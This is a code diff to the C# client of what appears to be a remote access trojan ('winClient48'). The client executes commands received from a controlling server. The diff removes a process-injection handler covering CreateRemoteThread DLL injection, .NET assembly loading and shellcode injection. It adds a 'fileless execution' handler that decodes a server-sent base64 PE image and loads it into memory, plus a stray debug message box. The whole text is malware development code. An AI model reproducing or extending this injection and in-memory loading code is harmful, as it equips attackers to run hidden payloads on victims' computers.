@@ -2419,7 +2419,7 @@ namespace winClient48
                 }
                 
                 #endregion
-                #region DLL
+                #region Injector
 
                 else if (cmd[0] == "injector")
                 {
@@ -2428,21 +2428,7 @@ namespace winClient48
 
                     (int nCode, string szMsg) x = (0, string.Empty);
 
-                    switch (dlm)
-                    {
-                        case DllLoaderMethod.CreateRemoteThread:
-                            int nProcId = int.Parse(cmd[3]);
-                            x = clsfnLoader.fnRemoteThread(abBuffer, nProcId);
-                            break;
-                        case DllLoaderMethod.DotNetAssemblyLoad:
-                            string szTypeName = cmd[3];
-                            string szMethod = cmd[4];
-                            x = clsfnLoader.fnLoadDotNetDll(abBuffer, szTypeName, szMethod);
-                            break;
-                        case DllLoaderMethod.ShellCode:
-                            x = clsfnLoader.fnInjectShellCode(abBuffer);
-                            break;
-                    }
+                    
 
                     v.SendCommand($"injector|{cmd[1]}|{x.nCode}|{clsCrypto.b64E2Str(x.szMsg)}");
                 }
@@ -2575,11 +2561,22 @@ namespace winClient48
 
                 else if (cmd[0] == "fle") //Fileless Execution
                 {
-                    string[] alpArgs = cmd[1].Split(',').Select(x => clsCrypto.b64D2Str(x)).ToArray();
-                    byte[] abAssembly = Convert.FromBase64String(cmd[2]);
-                    abAssembly = clsEZData.abGzipDecompress(abAssembly);
+                    if (cmd[1] == "x64")
+                    {
+                        clsfnLoader loader = new clsfnLoader();
 
-                    installer.fnLoadToMemory(alpArgs, abAssembly);
+                        string[] alpArgs = cmd[2].Split(',').Select(x => clsCrypto.b64D2Str(x)).ToArray();
+                        byte[] abAssembly = Convert.FromBase64String(cmd[3]);
+                        MessageBox.Show(abAssembly.Length.ToString());
+                        var ret = loader.fnLoadPeIntoMemory(abAssembly);
+
+                        v.fnSendCommand(new string[]
+                        {
+                        "fle",
+                        ret.nCode.ToString(),
+                        ret.szMsg,
+                        });
+                    }
                 }
 
                 #endregion
